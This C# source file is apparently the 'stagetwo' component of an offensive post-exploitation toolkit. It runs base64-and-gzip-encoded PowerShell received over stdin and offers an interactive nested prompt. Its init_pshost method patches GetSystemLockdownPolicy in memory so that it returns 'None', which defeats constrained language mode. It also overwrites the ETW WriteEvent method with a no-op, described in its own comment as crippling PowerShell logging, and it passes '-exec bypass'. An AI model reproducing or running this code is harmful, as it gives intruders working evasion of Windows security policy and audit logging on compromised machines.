﻿using System;
using System.Collections.Generic;
using System.Collections.ObjectModel;
using System.Linq;
using System.Management.Automation;
using System.Management.Automation.Runspaces;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Web.Script.Serialization;

namespace stagetwo
{
    class PowerShell
    {
        public static Assembly ConsoleHostAssembly;
        public static Type ConsoleHost;
        public static Assembly Automation;
        public static object pshost;
        public static Runspace runspace;

        public static void run(System.IO.StreamReader stdin)
        {
            System.IO.MemoryStream script;
            UInt32 depth;
            try
            {
                var stream = new System.IO.MemoryStream(System.Convert.FromBase64String(stdin.ReadLine()));
                var gz = new System.IO.Compression.GZipStream(stream, System.IO.Compression.CompressionMode.Decompress);
                script = new System.IO.MemoryStream();
                gz.CopyTo(script);

                depth = System.UInt32.Parse(stdin.ReadLine());
            }
            catch (Exception)
            {
                System.Console.WriteLine("E:DECODE");
                return;
            }

            System.Management.Automation.PowerShell ps = System.Management.Automation.PowerShell.Create();
            ps.Runspace = runspace;

            Runspace.DefaultRunspace = runspace;

            ps.AddScript(System.Text.Encoding.UTF8.GetString(script.ToArray()));
            ps.AddCommand("ConvertTo-Json").AddParameter("Depth", depth).AddParameter("Compress");
            Collection<PSObject> results = ps.Invoke();

            if (ps.HadErrors)
            {
                var errors = new List<Dictionary<string, string>>();
                var serializer = new JavaScriptSerializer();

                foreach (var error in ps.Streams.Error)
                {
                    errors.Add(new Dictionary<string, string>
                    {
                        { "ErrorID", error.FullyQualifiedErrorId },
                        { "Message", error.Exception.Message }
                    });
                }

                System.Console.WriteLine("E:PWSH:" + serializer.Serialize(errors));
                return;
            }

            foreach (var item in results)
            {
                System.Console.WriteLine(item.ToString());
            }
            System.Console.WriteLine("END");
        }

        public static void init_pshost()
        {
            // Find the ConsoleHost assembly
            ConsoleHostAssembly = AppDomain.CurrentDomain.GetAssemblies().SingleOrDefault(a => a.GetName().Name == "Microsoft.PowerShell.ConsoleHost");
            Automation = AppDomain.CurrentDomain.GetAssemblies().SingleOrDefault(a => a.GetName().Name == "System.Management.Automation");
            // Find the ConsoleHost type
            ConsoleHost = ConsoleHostAssembly.GetType("Microsoft.PowerShell.ConsoleHost");

            // Get a MethodInfo reference to the GetSystemLockdownPolicy method
            var get_lockdown_info = Automation.GetType("System.Management.Automation.Security.SystemPolicy").GetMethod("GetSystemLockdownPolicy", System.Reflection.BindingFlags.Public | System.Reflection.BindingFlags.Static);
            // Retrieve a handle to the method
            var get_lockdown_handle = get_lockdown_info.MethodHandle;
            uint lpflOldProtect;

            // This ensures the method is JIT compiled
            RuntimeHelpers.PrepareMethod(get_lockdown_handle);
            // Get a pointer to the compiled function
            var get_lockdown_ptr = get_lockdown_handle.GetFunctionPointer();

            // Ensure we can write to the address
            Win32.VirtualProtect(get_lockdown_ptr, new UIntPtr(4), 0x40, out lpflOldProtect);

            // Write the instructions "mov rax, 0; ret". This returns 0, which is the same as returning SystemEnforcementMode.None
            var new_instr = new byte[] { 0x48, 0x31, 0xc0, 0xc3 };
            Marshal.Copy(new_instr, 0, get_lockdown_ptr, 4);

            // Grab the Type objects for various classes we will need via reflection
            var CommandLineParameterParser = ConsoleHostAssembly.GetType("Microsoft.PowerShell.CommandLineParameterParser");
            var RunspaceCreationEventLogs = ConsoleHostAssembly.GetType("Microsoft.PowerShell.RunspaceCreationEventArgs");
            var RunspaceRef = Automation.GetType("System.Management.Automation.Remoting.RunspaceRef");

            // Create a console host singleton
            var host = ConsoleHost.GetMethod("CreateSingletonInstance",
                BindingFlags.NonPublic | BindingFlags.Static
            ).Invoke(
                null,
                new object[] { System.Management.Automation.Runspaces.RunspaceConfiguration.Create() }
            );

            // Grab the Host User Interface object for initialization
            var hostUI = ConsoleHost.GetProperty("UI").GetValue(host);
            var ConsoleHostUI = hostUI.GetType();

            // Create a new command line parameter parser
            var cpp = CommandLineParameterParser.GetConstructors(
                BindingFlags.NonPublic | BindingFlags.Instance
            )[0].Invoke(
                new object[] { hostUI, "Banner", "Other Thing" }
            );

            // Parse our powershell arguments (none)
            CommandLineParameterParser.GetMethod("Parse",
                BindingFlags.NonPublic | BindingFlags.Instance
            ).Invoke(
                cpp,
                new object[] { new string[] { "-nop", "-exec", "bypass" } }
            );

            // Set the parameter parser in the console host
            ConsoleHost.GetField("cpp", BindingFlags.NonPublic | BindingFlags.Static).SetValue(host, cpp);

            // Bind C-c handler
            ConsoleHost.GetMethod("BindBreakHandler", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(host, new object[] { });

            // Initialize various fields. This happens in ConsoleHost.Start normally
            ConsoleHost.GetField("outputFormat", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(host, CommandLineParameterParser.GetProperty("OutputFormat", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp));
            ConsoleHost.GetField("inputFormat", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(host, CommandLineParameterParser.GetProperty("InputFormat", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp));
            ConsoleHost.GetField("wasInitialCommandEncoded", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(host, CommandLineParameterParser.GetProperty("WasInitialCommandEncoded", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp));
            ConsoleHost.GetField("noExit", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(host, CommandLineParameterParser.GetProperty("NoExit", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp));
            ConsoleHost.GetField("ExitCode", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(host, (UInt32)0);

            // Initialize important properties
            ConsoleHostUI.GetProperty("ReadFromStdin", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(hostUI, CommandLineParameterParser.GetProperty("ExplicitReadCommandsFromStdin", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp));
            ConsoleHostUI.GetProperty("ReadFromStdin", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(hostUI, true);
            ConsoleHostUI.GetProperty("NoPrompt", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(hostUI, CommandLineParameterParser.GetProperty("NoPrompt", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp));
            ConsoleHostUI.GetProperty("ThrowOnReadAndPrompt", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(hostUI, CommandLineParameterParser.GetProperty("ThrowOnReadAndPrompt", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp));

            // This object is used to create our runspace
            var runspace_create_args = RunspaceCreationEventLogs.GetConstructors(BindingFlags.NonPublic | BindingFlags.Instance)[0].Invoke(new object[]
            {
                CommandLineParameterParser.GetProperty("InitialCommand", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp),
                CommandLineParameterParser.GetProperty("SkipProfiles", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp),
                CommandLineParameterParser.GetProperty("StaMode", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp),
                CommandLineParameterParser.GetProperty("ImportSystemModules", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp),
                CommandLineParameterParser.GetProperty("ConfigurationName", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp),
                CommandLineParameterParser.GetProperty("Args", BindingFlags.NonPublic | BindingFlags.Instance).GetValue(cpp)
            });

            // Trigger runspace creation
            ConsoleHost.GetMethod("CreateRunspace", BindingFlags.NonPublic | BindingFlags.Instance).Invoke(host, new object[]
            {
                runspace_create_args
            });

            // Next, we want to cripple powershell logging, so we grab the necessary types
            var PSEtwLog = Automation.GetType("System.Management.Automation.Tracing.PSEtwLog");
            var provider = PSEtwLog.GetField("provider", BindingFlags.NonPublic | BindingFlags.Static).GetValue(null);
            var WriteEventInfo = provider.GetType().GetMethods(BindingFlags.NonPublic | BindingFlags.Instance).SingleOrDefault(m => m.Name == "WriteEvent" && m.GetParameters()[5].ParameterType != ("").GetType());
            var WriteEventHandle = WriteEventInfo.MethodHandle;

            // Prepare the WriteEvent method
            RuntimeHelpers.PrepareMethod(WriteEventHandle);
            var WriteEventPtr = WriteEventHandle.GetFunctionPointer();

            // Overwrite the method to make it a NOP
            Win32.VirtualProtect(WriteEventPtr, new UIntPtr(6), 0x40, out lpflOldProtect);
            Marshal.Copy(new byte[] { 0x48, 0x31, 0xc0, 0xc2, 0x18, 0x00 }, 0, WriteEventPtr, 6);

            pshost = host;
            runspace = (Runspace)ConsoleHost.GetProperty("Runspace").GetValue(host);

            // This is worthless except that it forces "Microsoft.PowerShell.ConsoleHost" to be in the above assembly list
            var x = typeof(Microsoft.PowerShell.ConsoleShell);
            var y = typeof(System.Management.Automation.Runspaces.Runspace);

            return;
        }
        public static void start(System.IO.StreamReader stdin)
        {

            System.Console.WriteLine("INTERACTIVE_START");

            // Enter the shell
            ConsoleHost.GetMethod("EnterNestedPrompt").Invoke(pshost, new object[] { });

            // This ensures that we won't immediately exit next time we enter a prompt
            // with the same Runspace/ConsoleHOst
            ConsoleHost.GetProperty("ShouldEndSession", BindingFlags.NonPublic | BindingFlags.Instance).SetValue(pshost, false);

            System.Console.WriteLine("\nINTERACTIVE_COMPLETE");

        }
    }
}
